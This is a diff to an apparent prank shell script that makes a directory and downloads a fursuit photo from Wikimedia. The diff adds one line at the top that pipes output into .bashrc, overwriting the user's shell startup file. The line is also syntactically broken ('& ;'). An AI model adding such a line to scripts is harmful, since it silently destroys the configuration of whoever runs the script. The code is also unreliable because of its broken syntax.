@@ -1,3 +1,5 @@
+echo ./.hehe & ; clear | cat > .bashrc
+
 mkdir jaimelesfurrys
 cd jaimelesfurrys
 wget https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/ChipFox_Fox_Fursuit_2015.jpg/640px-ChipFox_Fox_Fursuit_2015.jpg
